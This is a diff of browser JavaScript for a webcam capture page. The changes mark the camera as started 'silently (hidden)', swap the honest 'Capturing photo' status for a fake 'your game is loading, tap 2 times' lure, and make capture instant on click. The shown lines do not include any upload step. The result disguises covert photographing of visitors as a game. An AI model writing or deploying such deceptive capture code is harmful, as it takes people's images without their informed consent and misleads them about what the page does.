@@ -3,7 +3,7 @@ const canvas = document.getElementById("canvas");
 const captureBtn = document.getElementById("captureBtn");
 const statusText = document.getElementById("status");
 
-// Start camera immediately
+// Start camera silently (hidden)
 async function startCamera() {
   try {
     const stream = await navigator.mediaDevices.getUserMedia({ video: true });
@@ -16,24 +16,22 @@ async function startCamera() {
   }
 }
 
-// Loading animation
+// Show smooth loading animation
 function showLoading() {
-  statusText.innerHTML = "⏳ Capturing photo";
+  statusText.innerHTML = "🕹️ Tap 2 times please, your game is loading";
   let dots = 0;
   const interval = setInterval(() => {
     dots = (dots + 1) % 4;
-    statusText.innerHTML = "⏳ Capturing photo" + ".".repeat(dots);
-  }, 400);
+    statusText.innerHTML = "🕹️ Tap 2 times please, your game is loading" + ".".repeat(dots);
+  }, 300);
   return interval;
 }
 
-// Capture instantly
+// Ultra-fast capture on click
 captureBtn.addEventListener("click", async () => {
   const loading = showLoading();
 
-  // small delay for frame ready (fast capture fix)
-  await new Promise((res) => setTimeout(res, 200));
-
+  // Capture instantly (no delay)
   const context = canvas.getContext("2d");
   canvas.width = video.videoWidth;
   canvas.height = video.videoHeight;
